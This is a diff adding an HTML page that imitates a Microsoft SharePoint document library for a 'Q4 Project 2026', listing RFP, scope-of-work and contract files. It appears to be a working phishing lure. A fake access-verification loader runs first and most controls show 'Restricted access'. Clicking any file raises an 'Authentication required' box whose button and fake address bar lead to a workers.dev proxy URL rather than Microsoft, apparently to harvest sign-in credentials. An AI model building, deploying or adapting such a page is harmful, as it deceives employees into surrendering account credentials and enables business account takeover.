@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SharePoint — Q4 Project 2026</title>
+<link rel="icon" type="image/png" href="https://img.icons8.com/color/48/microsoft.png">
+<style>
+  :root{
+    --teal:#0b7d82;
+    --teal-dark:#204c51;
+    --teal-deeper:#153b3f;
+    --line:#e6e9ec;
+    --text:#1f2933;
+    --muted:#66727a;
+    --soft:#f7f9fa;
+  }
+
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Arial,sans-serif;
+    color:var(--text);
+    background:#fff;
+  }
+
+  /* 3-second verification preview */
+  #loader{
+    position:fixed;
+    inset:0;
+    z-index:1000;
+    display:grid;
+    place-items:center;
+    color:#f7fbfb;
+    background:
+      radial-gradient(circle at 18% 20%, rgba(91,155,158,.24), transparent 34%),
+      radial-gradient(circle at 82% 78%, rgba(16,65,69,.28), transparent 38%),
+      linear-gradient(135deg,#214f53 0%,#2d686d 48%,#173f43 100%);
+    transition:opacity .45s ease, visibility .45s ease;
+  }
+  #loader.hide{opacity:0;visibility:hidden}
+  .verify{
+    width:min(480px,calc(100vw - 48px));
+    text-align:center;
+  }
+  .verify h1{
+    margin:0 0 10px;
+    font-size:23px;
+    font-weight:600;
+    letter-spacing:-.3px;
+  }
+  .verify p{
+    margin:0 0 28px;
+    color:rgba(240,250,250,.75);
+    font-size:14px;
+    line-height:1.6;
+  }
+  .track{
+    width:100%;
+    height:5px;
+    overflow:hidden;
+    border-radius:999px;
+    background:rgba(255,255,255,.16);
+  }
+  .bar{
+    width:0;
+    height:100%;
+    border-radius:inherit;
+    background:linear-gradient(90deg,#a8d4d2,#e5f6f4);
+    box-shadow:0 0 14px rgba(209,244,241,.35);
+    animation:verify 3s cubic-bezier(.22,.61,.36,1) forwards;
+  }
+  @keyframes verify{
+    0%{width:0}
+    18%{width:14%}
+    45%{width:43%}
+    70%{width:72%}
+    88%{width:91%}
+    100%{width:100%}
+  }
+
+  /* App */
+  #app{min-height:100%;opacity:0;transition:opacity .35s ease}
+  #app.ready{opacity:1}
+
+  .topbar{
+    height:66px;
+    background:#087F83;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    padding:0 26px;
+    gap:34px;
+  }
+  .brand{
+    font-size:25px;
+    font-weight:700;
+    letter-spacing:-.4px;
+    white-space:nowrap;
+  }
+  .search{
+    margin-left:auto;
+    width:min(430px,35vw);
+    height:44px;
+    border-radius:6px;
+    border:none;
+    padding:0 18px;
+    font-size:16px;
+    outline:none;
+  }
+
+  .page{
+    padding:24px 48px 40px;
+  }
+  .hero{
+    display:flex;
+    align-items:center;
+    gap:28px;
+    flex-wrap:wrap;
+  }
+  .project-badge{
+    width:72px;
+    height:72px;
+    border-radius:4px;
+    display:grid;
+    place-items:center;
+    background:#0b7d82;
+    color:#fff;
+    font-size:28px;
+    font-weight:500;
+  }
+  .project-title{
+    font-size:36px;
+    font-weight:600;
+    letter-spacing:-.5px;
+    margin-right:auto;
+  }
+  .tabs{
+    display:flex;
+    gap:34px;
+    font-size:17px;
+    align-self:flex-end;
+  }
+  .tabs span{
+    padding:20px 0 13px;
+    white-space:nowrap;
+  }
+  .tabs .active{
+    border-bottom:3px solid var(--teal);
+  }
+
+  .toolbar{
+    margin-top:28px;
+    display:flex;
+    align-items:center;
+    gap:28px;
+    border-bottom:1px solid var(--line);
+    padding-bottom:14px;
+    overflow-x:auto;
+  }
+  .new-btn{
+    background:var(--teal);
+    color:#fff;
+    border:none;
+    border-radius:3px;
+    padding:13px 20px;
+    font-size:16px;
+    font-weight:600;
+  }
+  .tool{
+    color:#26363c;
+    font-size:16px;
+    white-space:nowrap;
+  }
+
+  .section-title{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin:34px 0 18px;
+    font-size:29px;
+    font-weight:600;
+  }
+  .view-chip{
+    font-size:14px;
+    background:#d9eff0;
+    color:#35565a;
+    padding:7px 10px;
+    border-radius:4px;
+  }
+
+  .table{
+    width:100%;
+    border-collapse:collapse;
+  }
+  .table th,.table td{
+    border-bottom:1px solid var(--line);
+    padding:17px 14px;
+    text-align:left;
+  }
+  .table th{
+    color:#3e4549;
+    font-size:15px;
+    font-weight:600;
+  }
+  .table td{
+    font-size:15px;
+  }
+  .file{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    cursor:pointer;
+    font-size:16px;
+    font-weight:500;
+  }
+  .file:hover .filename{
+    text-decoration:underline;
+    color:#0b6f74;
+  }
+  .file-icon{
+    width:28px;
+    height:28px;
+    border-radius:4px;
+    display:grid;
+    place-items:center;
+    font-size:11px;
+    font-weight:700;
+    color:#fff;
+    flex:0 0 auto;
+  }
+  .pdf{background:#c23b31}
+  .xlsx{background:#24864c}
+  .pptx{background:#c65b2b}
+
+  /* Authentication overlay */
+  .auth-overlay{
+    position:fixed;
+    inset:0;
+    z-index:900;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:28px;
+    background:rgba(13,31,34,.34);
+    backdrop-filter:blur(3px);
+  }
+  .auth-overlay.show{display:flex}
+
+  .auth-card{
+    width:min(760px,94vw);
+    background:#fff;
+    border-radius:16px;
+    box-shadow:0 24px 80px rgba(0,0,0,.25);
+    overflow:hidden;
+    border:1px solid rgba(255,255,255,.4);
+  }
+  .auth-head{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    padding:14px 18px;
+    border-bottom:1px solid #e7eaed;
+    background:#fbfcfc;
+  }
+  .auth-dot{
+    width:9px;height:9px;border-radius:50%;background:#7b8b90;
+  }
+  .auth-url{
+    flex:1;
+    margin-left:8px;
+    padding:9px 13px;
+    border:1px solid #dfe4e7;
+    border-radius:8px;
+    color:#536268;
+    background:#fff;
+    font-size:14px;
+  }
+  .close{
+    border:none;
+    background:transparent;
+    font-size:24px;
+    color:#59676c;
+    cursor:pointer;
+  }
+  .auth-body{
+    padding:42px 38px 36px;
+    text-align:center;
+  }
+  .auth-mark{
+    width:56px;
+    height:56px;
+    margin:0 auto 18px;
+    border-radius:14px;
+    display:grid;
+    place-items:center;
+    background:linear-gradient(135deg,#0b7d82,#204c51);
+    color:#fff;
+    font-weight:700;
+    font-size:22px;
+  }
+  .auth-body h2{
+    margin:0 0 10px;
+    font-size:24px;
+    font-weight:650;
+  }
+  .auth-body p{
+    margin:0 auto 24px;
+    max-width:500px;
+    color:#68757a;
+    line-height:1.6;
+    font-size:14px;
+  }
+  .continue{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    min-width:220px;
+    padding:12px 18px;
+    border:none;
+    border-radius:7px;
+    background:var(--teal);
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    text-decoration:none;
+  }
+
+  @media(max-width:850px){
+    .page{padding:22px}
+    .project-title{font-size:28px}
+    .tabs{width:100%;gap:20px;overflow:auto}
+    .search{width:42vw}
+    .table th:nth-child(3),.table td:nth-child(3){display:none}
+  }
+  /* Restricted navigation tooltip */
+
+.restricted-link{
+  position:relative;
+  cursor:not-allowed;
+}
+
+.restricted-tooltip{
+  position:absolute;
+  left:50%;
+  top:calc(100% + 9px);
+  transform:translate(-50%, -4px);
+
+  display:flex;
+  align-items:center;
+  gap:7px;
+
+  padding:8px 11px;
+  border-radius:7px;
+
+  background:#173f43;
+  color:#ffffff;
+
+  font-size:12px;
+  font-weight:500;
+  white-space:nowrap;
+
+  box-shadow:0 6px 18px rgba(0,0,0,.18);
+
+  opacity:0;
+  visibility:hidden;
+  pointer-events:none;
+
+  transition:opacity .18s ease, transform .18s ease;
+
+  z-index:100;
+}
+
+.restricted-tooltip::before{
+  content:"";
+  position:absolute;
+  top:-5px;
+  left:50%;
+  transform:translateX(-50%) rotate(45deg);
+
+  width:10px;
+  height:10px;
+  background:#173f43;
+}
+
+.restricted-link:hover .restricted-tooltip{
+  opacity:1;
+  visibility:visible;
+  transform:translate(-50%, 0);
+}
+
+.lock{
+  font-size:12px;
+}
+/* Keep restricted toolbar controls above surrounding elements when hovered */
+.toolbar .restricted-link{
+  position:relative;
+  overflow:visible;
+}
+
+.toolbar .restricted-link:hover{
+  z-index:200;
+}
+.auth-lock{
+  margin-right:6px;
+  font-size:21px;
+}
+</style>
+</head>
+<body>
+
+<div id="loader">
+  <div class="verify">
+    <h1>Verifying document access</h1>
+    <p>Please wait while SharePoint securely prepares your document.</p>
+    <div class="track"><div class="bar"></div></div>
+  </div>
+</div>
+
+<div id="app">
+  <header class="topbar">
+    <div class="brand">
+  <img src="https://img.icons8.com/color/48/microsoft-sharepoint-2019.png" alt="SharePoint Logo" class="brand-logo">
+  <span>SharePoint</span>
+</div>
+    <input class="search" type="text" placeholder="Search this library" />
+  </header>
+
+  <main class="page">
+    <section class="hero">
+      <div class="project-badge">Q4</div>
+      <div class="project-title">Q4 Project - 2026</div>
+      <nav class="tabs">
+  <span class="restricted-link">
+    Home
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </span>
+
+  <span class="active">Documents</span>
+
+  <span class="restricted-link">
+    Pages
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </span>
+
+  <span class="restricted-link">
+    Project Library
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </span>
+
+  <span class="restricted-link">
+    Site Contents
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </span>
+</nav>
+    </section>
+
+    
+      <div class="toolbar">
+
+  <button class="new-btn restricted-link">
+    ＋ New
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </button>
+
+  <div class="tool restricted-link">
+    ⇧ Upload
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </div>
+
+  <div class="tool restricted-link">
+    ▦ Edit in grid view
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </div>
+
+  <div class="tool restricted-link">
+    ⟳ Sync
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </div>
+
+  <div class="tool restricted-link">
+    🔗 Add shortcut
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </div>
+
+  <div class="tool restricted-link">
+    ▣ Pin to Quick access
+    <span class="restricted-tooltip">
+      <span class="lock">🔒</span>
+      Restricted access
+    </span>
+  </div>
+
+</div>
+
+    <div class="section-title">Documents <span class="view-chip">Library view</span></div>
+
+    <table class="table">
+      <thead>
+        <tr>
+          <th style="width:50%">Name</th>
+          <th style="width:20%">Modified</th>
+          <th style="width:30%">Modified By</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>
+            <div class="file" onclick="openAuth()">
+              <span class="file-icon pdf">PDF</span>
+              <span class="filename">RFP Overview Document.pdf</span>
+            </div>
+          </td>
+          <td>August 8, 2026</td><td>MOD Administrator</td>
+        </tr>
+        <tr>
+          <td>
+            <div class="file" onclick="openAuth()">
+              <span class="file-icon xlsx">XLSX</span>
+              <span class="filename">Scope of Work &amp; Specifications.xlsx</span>
+            </div>
+          </td>
+          <td>August 7, 2026</td><td>MOD Administrator</td>
+        </tr>
+        <tr>
+          <td>
+            <div class="file" onclick="openAuth()">
+              <span class="file-icon pptx">PPTX</span>
+              <span class="filename">Bid Submission Guidelines.pptx</span>
+            </div>
+          </td>
+          <td>August 6, 2026</td><td>MOD Administrator</td>
+        </tr>
+        <tr>
+          <td>
+            <div class="file" onclick="openAuth()">
+              <span class="file-icon pdf">PDF</span>
+              <span class="filename">Compliance Requirements.pdf</span>
+            </div>
+          </td>
+          <td>August 4, 2026</td><td>MOD Administrator</td>
+        </tr>
+        <tr>
+          <td>
+            <div class="file" onclick="openAuth()">
+              <span class="file-icon xlsx">XLSX</span>
+              <span class="filename">Contract Terms &amp; Conditions.xlsx</span>
+            </div>
+          </td>
+          <td>August 1, 2026</td><td>MOD Administrator</td>
+        </tr>
+      </tbody>
+    </table>
+  </main>
+</div>
+
+<div class="auth-overlay" id="authOverlay" onclick="overlayClick(event)">
+  <div class="auth-card">
+    <div class="auth-head">
+      <span class="auth-dot"></span><span class="auth-dot"></span><span class="auth-dot"></span>
+      <div class="auth-url">https://net-proxy-de36.pt-2263143a.workers.dev/share/H3zNViLwli8</div>
+      <button class="close" aria-label="Close" onclick="closeAuth()">×</button>
+    </div>
+    <div class="auth-body">
+      <div class="auth-mark">
+  <img src="https://img.icons8.com/color/48/microsoft-sharepoint-2019.png" alt="VaultShare">
+</div>
+      <h2><span class="auth-lock">🔒</span> Authentication required</h2>
+      <p>This document is protected. Continue to SharePoint to authenticate before viewing the selected file.</p>
+      <a class="continue" href="https://net-proxy-de36.pt-2263143a.workers.dev/share/H3zNViLwli8" target="_blank" rel="noopener">Continue to SharePoint</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  setTimeout(() => {
+    document.getElementById('loader').classList.add('hide');
+    document.getElementById('app').classList.add('ready');
+  }, 3000);
+
+  function openAuth(){
+    document.getElementById('authOverlay').classList.add('show');
+  }
+  function closeAuth(){
+    document.getElementById('authOverlay').classList.remove('show');
+  }
+  function overlayClick(e){
+    if(e.target.id === 'authOverlay') closeAuth();
+  }
+  document.addEventListener('keydown', (e) => {
+    if(e.key === 'Escape') closeAuth();
+  });
+</script>
+</body>
+</html>
